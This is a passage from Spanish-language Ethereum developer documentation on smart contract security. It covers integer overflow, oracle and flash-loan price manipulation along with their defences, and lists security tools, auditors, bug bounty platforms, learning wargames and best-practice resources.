A partir de la versión 0.8.0, el compilador de Solidity rechaza el código que da como resultado desbordamientos de enteros, tanto overflows como underflows. No obstante, los contratos compilados con una versión inferior del compilador deben realizar comprobaciones de funciones que impliquen operaciones aritméticas o utilizar una biblioteca (por ejemplo, [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)) que compruebe los desbordamientos en ambos sentidos.

#### Manipulación de oráculos {#oracle-manipulation}

Los [oráculos](/developers/docs/oracles/) obtienen información fuera de la cadena y la envían en cadena para que los contratos inteligentes la usen. Con los oráculos, puede diseñar contratos inteligentes que interactúen con sistemas fuera de la cadena, como los mercados de capitales, ampliando en gran medida su aplicación.

Pero si el oráculo está dañado y envía información incorrecta en cadena, los contratos inteligentes se ejecutarán en función de entradas erróneas, lo que puede causar problemas. Esta es la base del "problema del oráculo", que se refiere a la tarea de asegurarse de que la información de un oráculo de cadena de bloques sea precisa, actualizada y oportuna.

Una preocupación de seguridad relacionada es el uso de un oráculo en cadena, como un exchange descentralizado, para obtener el precio al contado de un activo. Las plataformas de préstamos en la industria de las [finanzas descentralizadas (DeFi)](/defi/) a menudo hacen esto para determinar el valor del colateral de un usuario para determinar cuánto puede pedir prestado.

Los precios de los DEX suelen ser precisos, en gran parte debido a que los arbitradores restauran la paridad en los mercados. No obstante, están abiertos a la manipulación, especialmente si el oráculo en cadena calcula los precios de los activos en función de los patrones comerciales históricos (como suele ser el caso).

Por ejemplo, un atacante podría inflar artificialmente el precio al contado de un activo obteniendo un préstamo flash justo antes de interactuar con su contrato de préstamo. Consultar el precio del activo en el DEX devolvería un valor más alto de lo normal (debido a la gran "orden de compra" del atacante que sesga la demanda del activo), lo que le permitiría pedir prestado más de lo permitido. Tales "ataques de préstamos flash" se han utilizado para explotar la dependencia de los oráculos de precios entre las aplicaciones DeFi, lo que ha costado a los protocolos millones en fondos perdidos.

##### Cómo prevenir la manipulación de los oráculos

El requisito mínimo para [evitar la manipulación del oráculo](https://www.cyfrin.io/blog/price-oracle-manipultion-attacks-with-examples) consiste en utilizar una red de oráculo descentralizada que obtiene información de múltiples fuentes para evitar un único punto de error. En la mayoría de los casos, los oráculos descentralizados tienen incentivos criptoeconómicos incorporados para alentar a los nodos de oráculos a que pasen información correcta, lo que los hace más seguros que los oráculos centralizados.

Si planea consultar a un oráculo en cadena precios de activos, considere el uso de uno que implemente un mecanismo de precio promedio ponderado en el tiempo (TWAP). Un [Oráculo TWAP](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) consulta el precio de un activo en dos puntos diferentes en el tiempo (que puede modificar) y calcula el precio al contado en función del promedio obtenido. La elección de períodos de tiempo más largos protege su protocolo contra la manipulación de precios, ya que los pedidos grandes ejecutados recientemente no pueden afectar a los precios de los activos.

## Recursos de seguridad de contratos inteligentes para desarrolladores {#smart-contract-security-resources-for-developers}

### Herramientas para analizar contratos inteligentes y verificar la corrección del código {#code-analysis-tools}

- **[Herramientas y bibliotecas de prueba:](/developers/docs/smart-contracts/testing/#testing-tools-and-libraries)** _Colección de herramientas y bibliotecas estándar de la industria para realizar pruebas unitarias, análisis estático y análisis dinámico en contratos inteligentes. _

- **[Herramientas de verificación formal:](/developers/docs/smart-contracts/formal-verification/#formal-verification-tools)** _Herramientas para verificar la corrección funcional en contratos inteligentes y comprobar invariantes. _

- **[Servicios de auditoría de contratos inteligentes:](/developers/docs/smart-contracts/testing/#smart-contract-auditing-services)** _Lista de organizaciones que proporcionan servicios de auditoría de contratos inteligentes para proyectos de desarrollo de Ethereum. _

- **[Plataformas de recompensa por errores:](/developers/docs/smart-contracts/testing/#bug-bounty-platforms)** _Plataformas para coordinar recompensas de errores y premiar la notificación responsable de vulnerabilidades críticas en los contratos inteligentes._

- **[Fork Checker:](https://forkchecker.hashex.org/)** _Una herramienta en línea gratuita para comprobar toda la información disponible sobre un contrato bifurcado. _

- **[ABI Encoder:](https://abi.hashex.org/)** _Servicio en línea gratuito para codificar funciones de contratos y argumentos constructor de Solidity. _

- **[Aderyn](https://github.com/Cyfrin/aderyn)**: _Analizador estático de Solidity, que atraviesa los Árboles de Sintaxis Abstracta (AST) para identificar vulnerabilidades sospechosas e imprimir problemas en un formato de reducción fácil de consumir._

### Herramientas para monitorear contratos inteligentes {#smart-contract-monitoring-tools}

- **[OpenZeppelin Defender Sentinels:](https://docs.openzeppelin.com/defender/v1/sentinel)** _Una herramienta para monitorear y responder automáticamente a eventos, funciones y parámetros de transacción en sus contratos inteligentes. _

- **[Tenderly Real-Time Alerting:](https://tenderly.co/alerting/)** _Una herramienta para recibir notificaciones en tiempo real cuando ocurren eventos inusuales o inesperados en sus contratos inteligentes o billeteras. _

### Herramientas para la administración segura de contratos inteligentes {#smart-contract-administration-tools}

- **[OpenZeppelin Defender Admin:](https://docs.openzeppelin.com/defender/v1/admin)** _interfaz para gestionar la administración de contratos inteligentes, incluidos los controles de acceso, las actualizaciones y pausas._

- **[Safe:](https://safe.global/)** _Billetera de contrato inteligente que se ejecuta en Ethereum y requiere un número mínimo de personas para aprobar una transacción antes de que pueda ocurrir (M de N). _

- **[Contratos OpenZeppelin:](https://docs.openzeppelin.com/contracts/4.x/)** _Bibliotecas de contratos para implementar funciones administrativas, incluida la propiedad del contrato, actualizaciones, controles de acceso, gobernanza, pausa y otras._

### Servicios de auditoría de contratos inteligentes {#smart-contract-auditing-services}

- **[ConsenSys Diligence:](https://consensys.net/diligence/)** _Servicio de auditoría de contratos inteligentes que ayuda a los proyectos de todo el ecosistema de cadenas de bloques a garantizar que sus protocolos estén listos para su lanzamiento y creados para proteger a los usuarios._

- **[CertiK:](https://www.certik.com/)** _Firma de seguridad de cadenas de bloques pionera en el uso de tecnología de verificación formal de vanguardia en contratos inteligentes y redes de cadena de bloques._

- **[Trail of Bits:](https://www.trailofbits.com/)** _Empresa de ciberseguridad que combina la investigación de seguridad con una mentalidad de atacante para reducir el riesgo y fortalecer el código._

- **[PeckShield:](https://peckshield.com/)** _Empresa de seguridad de cadena de bloques que ofrece productos y servicios para la seguridad, privacidad y facilidad de uso de todo el ecosistema de cadena de bloques._

- **[QuantStamp:](https://quantstamp.com/)** _Servicio de auditoría que facilita la adopción general de la tecnología de cadena de bloques a través de servicios de seguridad y evaluación de riesgos._

- **[OpenZeppelin:](https://www.openzeppelin.com/security-audits)** _Empresa de seguridad de contratos inteligentes que proporciona auditorías de seguridad para sistemas distribuidos._

- **[Runtime Verification:](https://runtimeverification.com/)** _Empresa de seguridad especializada en el modelado formal y la verificación de contratos inteligentes._

- **[Hacken:](https://hacken.io)** _Auditor de ciberseguridad Web3 que aporta el enfoque de 360 grados a la seguridad de la cadena de bloques. _

- **[Nethermind:](https://nethermind.io/smart-contracts-audits)** _Servicios de auditoría de Solidity y Cairo que garantizan la integridad de los contratos inteligentes y la seguridad de los usuarios en Ethereum y Starknet._

- **[HashEx:](https://hashex.org/)** _HashEx se centra en la auditoría de cadena de bloques y contratos inteligentes para garantizar la seguridad de las criptomonedas, proporcionando servicios como el desarrollo de contratos inteligentes, las pruebas de penetración y la consultoría de cadenas de bloques. _

- **[Code4rena:](https://code4rena.com/)** _Plataforma de auditoría competitiva que incentiva a los expertos en seguridad de contratos inteligentes a encontrar vulnerabilidades y ayudar a que la Web3 sea más segura._

- **[CodeHawks](https://codehawks.com/)**: _plataforma de auditorías competitivas que aloja licitaciones de auditorías de contratos inteligentes para investigadores de seguridad._

- **[Cyfrin:](https://cyfrin.io)** _Plataforma de seguridad web3 que incuba la seguridad criptográfica a través de productos y servicios de auditoría de contratos inteligentes._

- **[ImmuneBytes](https://www.immunebytes.com//smart-contract-audit/)**: _empresa de seguridad en Web3 que ofrece auditorías de seguridad para sistemas de cadena de bloque mediante un equipo de auditores expertos y las mejores herramientas existentes._

- **[Oxorio:](https://oxor.io/)** _Auditorías de contratos inteligentes y servicios de seguridad de cadena de bloques con experiencia en EVM, Solidity, ZK y tecnología de cadena cruzada para empresas criptográficas y proyectos DeFi._

- **[Inference:](https://inference.ag/)** _Empresa de auditoría de seguridad especializada en auditoría de contratos inteligentes para cadenas de bloques basadas en EVM. Gracias a sus auditores expertos, identifican posibles problemas y sugieren soluciones prácticas para solucionarlos antes de la implementación._

### Plataformas de recompensas por errores {#bug-bounty-platforms}

- **[Immunefi:](https://immunefi.com/)** _Plataforma de recompensas de errores para contratos inteligentes y proyectos DeFi donde los investigadores de seguridad revisan el código, revelan vulnerabilidades, obtienen incentivos económicos y hacen que las criptomonedas sean más seguras. _

- **[HackerOne:](https://www.hackerone.com/)** _Plataforma de coordinación de vulnerabilidades y recompensas por errores que conecta a las empresas con evaluadores de penetración e investigadores de ciberseguridad. _

- **[HackenProof:](https://hackenproof.com/)** _Plataforma experta de recompensas por errores para proyectos criptográficos (DeFi, Smart Contracts, Wallets, CEX y más), donde profesionales de seguridad proporcionan servicios de triaje y a los investigadores se les paga por informes de errores relevantes y verificados. _

-  **[Sherlock:](https://www.sherlock.xyz/)** _Asegurador en Web3 para la seguridad de los contratos inteligentes, con pagos para auditores gestionados a través de contratos inteligentes para garantizar que los errores relevantes se paguen de manera justa._

-  **[CodeHawks:](https://www.codehawks.com/)** _Plataforma de recompensas por errores competitivas donde los auditores participan en concursos y desafíos de seguridad, y (pronto) en sus propias auditorías privadas._

### Publicaciones de vulnerabilidades y explotaciones conocidas en los contratos inteligentes {#common-smart-contract-vulnerabilities-and-exploits}

- **[ConsenSys: ataques conocidos de contratos inteligentes:](https://consensys.github.io/smart-contract-best-practices/attacks/)** _ Explicación para principiantes de las vulnerabilidades de contratos más importantes, con código de ejemplo para la mayoría de los casos. _

- **[Registro SWC:](https://swcregistry.io/)** _Lista curada de elementos de Common Weakness Enumeration (CWE) que se aplican a los contratos inteligentes de Ethereum._

- **[Rekt:](https://rekt.news/)** _Publicación actualizada regularmente de hackeos y explotaciones cripto de alto perfil, junto con informes detallados post-mortem. _

### Desafíos para aprender sobre seguridad en los contratos inteligentes {#challenges-for-learning-smart-contract-security}

- **[Awesome BlockSec CTF:](https://github.com/blockthreat/blocksec-ctfs)** _Lista curada de juegos de guerra de seguridad de cadena de bloques, desafíos, y competencias y escritos de soluciones de [Capture The Flag](https://www.webopedia.com/definitions/ctf-event/amp/)._

- **[Damn Vulnerable DeFi:](https://www.damnvulnerabledefi.xyz/)** _Juego de guerra para aprender sobre seguridad de ofensiva en contratos inteligentes DeFi y desarrollar habilidades en la búsqueda de errores y la auditoría de seguridad. _

- **[Ethernaut:](https://ethernaut.openzeppelin.com/)** _Juego de guerra basado en la Web3/Solidity donde cada nivel es un contrato inteligente que necesita ser "hackeado". _

- **[HackenProof x HackTheBox:](https://app.hackthebox.com/tracks/HackenProof-Track)** _Desafío de piratería de contrato inteligente, ambientado en una aventura de fantasía. La finalización exitosa del desafío también da acceso a un programa privado de recompensas por errores._

### Mejores prácticas para proteger contratos inteligentes {#smart-contract-security-best-practices}

- **[ConsenSys: mejores prácticas de seguridad de contratos inteligentes de Ethereum:](https://consensys.github.io/smart-contract-best-practices/)** _Lista exhaustiva de directrices para proteger contratos inteligentes de Ethereum._

- **[Nascent: Kit de herramientas de seguridad simple:](https://github.com/nascentxyz/simple-security-toolkit)** _Colección de guías prácticas centradas en la seguridad y listas de verificación para el desarrollo de contratos inteligentes._

- **[Solidity Patterns:](https://fravoll.github.io/solidity-patterns/)** _Recopilación útil de patrones seguros y de mejores prácticas para el lenguaje de programación de contratos inteligentes Solidity. _

- **[Documentos de Solidity: Consideraciones de seguridad:](https://docs.soliditylang.org/en/v0.8.16/security-considerations.html)** _Directrices para escribir contratos inteligentes seguros con Solidity. _

- **[Estándar de verificación de seguridad de contratos inteligentes:](https://github.com/securing/SCSVS)** _Lista de verificación de catorce partes creada para estandarizar la seguridad de los contratos inteligentes para desarrolladores, arquitectos, revisores y proveedores de seguridad. _

- **[Aprenda sobre seguridad y auditorías de contratos inteligentes:](https://updraft.cyfrin.io/courses/security)** _Curso definitivo de seguridad y auditoría de contratos inteligentes creado para desarrolladores de contratos inteligentes que buscan mejorar sus buenas prácticas de seguridad y convertirse en investigadores de seguridad._

### Tutoriales sobre seguridad de contratos inteligentes {#tutorials-on-smart-contract-security}

- [Cómo escribir contratos inteligentes seguros](/developers/tutorials/secure-development-workflow/)

- [Cómo usar Slither para encontrar errores en contratos inteligentes](/developers/tutorials/how-to-use-slither-to-find-smart-contract-bugs/)

- [Cómo utilizar Manticore para encontrar errores en contratos inteligentes](/developers/tutorials/how-to-use-manticore-to-find-smart-contract-bugs/)

- [Pautas de seguridad de contratos inteligentes](/developers/tutorials/smart-contract-security-guidelines/)

- [Cómo integrar de forma segura su contrato de tokens con tokens arbitrarios](/developers/tutorials/token-integration-checklist/)

- [Cyfrin Updraft: curso completo sobre seguridad de contratos inteligentes y auditoría](https://updraft.cyfrin.io/courses/security)
